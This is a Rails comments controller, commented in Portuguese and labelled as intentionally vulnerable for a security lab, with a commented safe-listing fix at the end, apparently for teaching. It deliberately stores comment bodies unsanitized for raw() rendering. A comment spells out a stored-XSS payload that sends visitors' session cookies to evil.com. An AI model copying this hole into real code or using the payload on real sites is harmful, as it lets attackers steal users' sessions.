# app/controllers/comments_controller.rb
#
# ⚠️  INTENCIONALMENTE VULNERÁVEL — APENAS PARA LABORATÓRIO
#
# Vulnerabilidades:
#   XSS stored: body não é sanitizado; a view usa raw() para renderizar

class CommentsController < ApplicationController
  def create
    @book = Book.find(params[:book_id])

    # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
    # ⚠️  VULNERABILIDADE: XSS STORED (Persistent)
    # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
    # O body do comentário é salvo no banco sem nenhuma sanitização.
    # A view renderiza com raw(), permitindo execução de scripts:
    #
    #   Payload: <script>document.location='http://evil.com/c?='+document.cookie</script>
    #
    # Todo visitante da página terá seu cookie de sessão roubado.
    # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
    @comment = @book.comments.build(
      body:   params[:comment][:body],
      rating: params[:comment][:rating],
      user:   current_user
    )

    if @comment.save
      redirect_to @book, notice: "Comentário publicado!"
    else
      @comments = @book.comments.includes(:user).order(created_at: :desc)
      render "books/show", status: :unprocessable_entity
    end
  end

  def destroy
    @comment = Comment.find(params[:id])
    @book    = @comment.book

    if @comment.user == current_user || admin?
      @comment.destroy
      redirect_to @book, notice: "Comentário removido."
    else
      redirect_to @book, alert: "Não autorizado."
    end
  end

  # ─────────────────────────────────────────────────────────────
  # VERSÃO SEGURA (para mostrar no E03):
  #
  # require "rails/html_sanitizer"
  # sanitizer = Rails::Html::SafeListSanitizer.new
  #
  # body = sanitizer.sanitize(
  #   params[:comment][:body],
  #   tags: %w[b i em strong],  # whitelist mínima
  #   attributes: []
  # )
  #
  # E na view: usar <%= @comment.body %> sem raw()
  # O ERB faz HTML escape automaticamente → <script> vira &lt;script&gt;
  # ─────────────────────────────────────────────────────────────
end
